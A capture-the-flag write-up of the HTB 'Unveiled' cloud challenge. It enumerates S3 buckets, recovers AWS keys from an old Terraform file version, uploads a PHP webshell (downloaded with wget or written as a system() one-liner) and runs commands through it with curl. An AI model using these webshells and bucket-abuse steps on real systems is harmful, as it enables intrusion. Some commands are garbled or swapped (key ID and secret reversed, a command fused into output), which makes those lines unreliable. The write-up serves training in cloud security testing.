# Unveiled (Cloud Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Category: Cloud
Difficulty: Easy
Points: 1000
N/A

## Strategy
The premise revolving around this challenge was to upload a PHP webshell to an openly-accessible AWS S3 Bucket and obtain RCE for the flag.

Connect to the HTB VPN via `sudo openvpn <vpntoken>.ovpn`
Add `unveiled.htb` to your `/etc/hosts` file for local DNS resolution.

Running nmap to the target:
```text
Nmap scan report for unveiled.htb (10.129.253.25)
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Travel to Planet Red
|_http-server-header: Apache/2.4.41
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Browsing to the website at `http://unveiled.htb` and viewing the source (CTRL + U), we discover a hidden comment detailing another virtual host of `s3.unveiled.htb` which we add to our `/etc/hosts` file and a username of `galen` as shown below.
![unveiled_1](images/unveiled_1.png)
```text
<!-- Last updated Tue 20 Jun 2023 02:39:53 PM by galen-->
<!-- Last updated Tue 20 Jun 2023 02:39:53 PM by galen-->
<script src="http://s3.unveiled.htb/unveiled-backups/main.js"/>
```

AWS Endpoint Function Workaround (Added https://github.com/aws/aws-cli/pull/8006/commits/e34caf506696db97c24d40da5a45e3e5b3bc5cb2)
Make sure you are running the latest version of `aws-cli` so you don't have to type the `--endpoint-url` every time or use the following:
```sh
$ export AWS_ENDPOINT_URL=http://s3.unveiled.htb
function aws() {
	export AWS_DEFAULT_OUTPUT=yaml 
	if [ -z "$AWS_ENDPOINT_URL" ]
	then
		command aws "$@"
	else
		command aws "$@" --endpoint-url "$AWS_ENDPOINT_URL"
	fi
}
```

List buckets accessible:
```sh
$ aws s3api list-buckets
Buckets:
- CreationDate: '2023-07-14T21:12:16+00:00'
  Name: unveiled-backups
- CreationDate: '2023-07-14T21:12:17+00:00'
  Name: website-assets
Owner:
  DisplayName: webfile
  ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a

$ aws s3api list-objects-v2 --bucket 'unveiled-backups'
Contents:
- ETag: '"3460d1a10fd1e53c6dbc1f8acd4c3a1b"'
  Key: index.html
  LastModified: '2023-07-14T21:12:18+00:00'
  Size: 4495
  StorageClass: STANDARD
- ETag: '"9c9e9d85b28ce6bbbba93e0860389c65"'
  Key: main.tf
  LastModified: '2023-07-14T21:12:19+00:00'
  Size: 1107
  StorageClass: STANDARD

$ aws s3 ls s3://unveiled-backups/
2023-07-14 17:12:18       4495 index.html
2023-07-14 17:12:19       1107 main.tf
```

Download Files:
```sh
$ aws s3 cp --recursive s3://unveiled-backups .
or ..
$ aws s3 sync s3://unveiled-backups/ .
download: s3://unveiled-backups/main.tf to ./main.tf
download: s3://unveiled-backups/index.html to ./index.html
```

List Bucket Access Control List (ACL):
```sh
$ aws s3api get-bucket-acl --bucket unveiled-backups
Grants:
- Grantee:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
    Type: CanonicalUser
  Permission: FULL_CONTROL
Owner:
  DisplayName: webfile
  ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
```

Unintended solution (upload a webshell without creds):
```sh
$ wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
$ aws s3api put-object --bucket website-assets --key shell.php --body shell.php
or ...
$ aws s3 cp shell.php s3://website-assets
```

Get AWS S3 Bucket Version Control History:
```sh
$ aws s3api list-object-versions --bucket unveiled-backups
Versions:
- ETag: '"3460d1a10fd1e53c6dbc1f8acd4c3a1b"'
  IsLatest: true
  Key: index.html
  LastModified: '2023-07-14T22:32:50+00:00'
  Owner:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
  Size: 4495
  StorageClass: STANDARD
  VersionId: 00c4f891-631b-48a8-a958-e01b196af4f7
- ETag: '"3596df2e55e9786e11a09c32ae21c33c"'
  IsLatest: false
  Key: index.html
  LastModified: '2023-07-14T22:32:50+00:00'
  Owner:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
  Size: 4438
  StorageClass: STANDARD
  VersionId: ab1f42c7-0c8d-4a5b-8d70-05d95b71c937
- ETag: '"9c9e9d85b28ce6bbbba93e0860389c65"'
  IsLatest: true
  Key: main.tf
  LastModified: '2023-07-14T22:32:50+00:00'
  Owner:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
  Size: 1107
  StorageClass: STANDARD
  VersionId: e760e5b7-cde9-485e-9a6b-de15e1694886
- ETag: '"4947c773e44f5973a9c3d37f24cb8e63"'
  IsLatest: false
  Key: main.tf
  LastModified: '2023-07-14T22:32:50+00:00'
  Owner:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
  Size: 1167aws s3api get-object --bucket unveiled-backups --key index.html --version-id 00c4f891-631b-48a8-a958-e01b196af4f7 index.html.old
```

Get Old Revision of Files:
```sh
$ aws s3api get-object --bucket unveiled-backups --key main.tf --version-id 2660dd61-14c4-47e4-ad0e-931c14da88a9 main.tf.old
AcceptRanges: bytes
ContentLength: 1167
ContentType: binary/octet-stream
ETag: '"4947c773e44f5973a9c3d37f24cb8e63"'
LastModified: '2023-07-14T22:32:50+00:00'
Metadata: {}
VersionId: 2660dd61-14c4-47e4-ad0e-931c14da88a9

$ aws s3api get-object --bucket unveiled-backups --key index.html --version-id 00c4f891-631b-48a8-a958-e01b196af4f7 index.html.old
AcceptRanges: bytes
ContentLength: 4495
ContentType: text/html
ETag: '"3460d1a10fd1e53c6dbc1f8acd4c3a1b"'
LastModified: '2023-07-14T22:32:50+00:00'
Metadata: {}
VersionId: 00c4f891-631b-48a8-a958-e01b196af4f7

$ head ./unveiled-backups-old/main.tf
variable "aws_access_key"{
  default = "AKIA6CFMOGFLAHOPQTMA"
}
variable "aws_secret_key"{
  default = "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"
}
```

Configure AWS-CLI with new AWS secrets and check if we can access the private S3 bucket of `website-assets`.
```sh
$ aws configure
AWS Access Key ID: tLK3S3CNsXfj0mjPsIH2iCh5odYHMPDwSVxn7CB5
AWS Secret Access Key: AKIA6CFMOGFLAHOPQTMA
Default region name [us-east-1]:
Default output format [None]:

$ aws sts get-caller-identity
Account: '683633011377'
Arn: arn:aws:iam::683633011377:user/will
UserId: AKIAIOSFODNN7DXV3G29

$ aws s3 ls s3://website-assets
2023-07-14 18:32:49      91790 background.jpg
2023-07-14 18:32:49       4372 index.html
```

Upload webshell with new access keys:
```sh
$ wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
or ...
$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

$ aws s3api put-object --bucket website-assets --key shell.php --body shell.php
or ...
$ aws s3 cp shell.php s3://website-assets
```

Access webshell:
```sh
$ firefox http://unveiled.htb/shell.php
```
Can also fetch the flag via curl:
```sh
curl -s -X POST 'http://unveiled.htb/shell.php?feature=shell' --data 'cmd=cat /var/www/flag.txt' | jq -r '.stdout'|base64 -d
HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}
```

Flag: `HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}`